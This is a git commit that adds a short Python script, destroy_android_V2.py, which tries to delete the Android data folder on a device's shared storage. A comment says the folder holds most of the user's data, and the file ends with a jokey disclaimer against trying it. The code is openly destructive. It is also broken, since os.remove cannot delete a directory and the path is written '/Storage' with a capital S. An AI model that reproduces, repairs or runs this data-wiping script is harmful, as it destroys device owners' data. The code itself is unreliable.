a2046ac120652dd4c69718bc13a11fd2e3cf15f8
john220099 <148237962+John220099@users.noreply.github.com>
2024-04-27 20:21:04 +0200

    Create destroy_android_V2.py

---
+++ destroy_android_V2.py
@@ -0,0 +1,6 @@
+#import os
+import os
+#delete the android, folder where most data is safe in
+os.remove("/Storage/emulated/0/Android") 
+
+#also DON'T try this at home I am not responsible for any damage done 
